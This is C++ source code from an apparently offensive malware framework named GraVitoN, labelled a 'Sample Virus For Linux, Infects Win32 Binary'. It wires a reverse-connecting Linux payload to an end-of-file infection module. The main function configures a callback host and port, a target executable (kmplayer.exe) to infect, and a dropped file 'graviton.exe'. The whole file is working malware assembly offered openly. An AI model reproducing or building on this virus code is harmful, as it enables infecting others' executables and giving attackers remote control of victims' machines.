/**
 * @file
 *
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Sample Virus For Linux, Infects Win32 Binary
 *
*/

/// Activate/Deactivate GraVitoN logger
// #define GVN_ACTIVATE_LOGGER
/// Print logs into a file
//#define GVN_LOG_INTO_FILE
/// Path to Log File
//#define GVN_LOG_FILE "./graviton_logs.txt"

#include "../../../graviton.hpp"
#include "../../../gvn_ai/gvn_ai_virus_sample.hpp"
#include "../../../gvn_spread/generic/gvn_spread_endoffile.hpp"
#include "../../../gvn_payload/linux/gvn_payload_linux64r.hpp"

class My_Virus_AI : public AI_Virus_Sample
{
protected:
	virtual bool initializeInternalComponents()
	{
		payload = new Payload_Linux64r();
		spread = new Spread_EndOfFile();

		payload->initialize(options);
		spread->initialize(options);
	}
};

int main()
{
	My_Virus_AI viri;

	viri.initialize(
		" HOST=192.168.56.1 "
		" PORT=7357 "
		""
		" Decom=Win32 "
		" Target=decom/target.exe "
		" DecTarget='kmplayer.exe' "
		" DecTargetPath='' "
		" NumFiles=1 "
		" File1=graviton.exe "
		" DecFile1=graviton.exe "
		" DecFilePath1='C:\\' "
		" IsExec1=true ");
	viri.run();

	return 0;
}
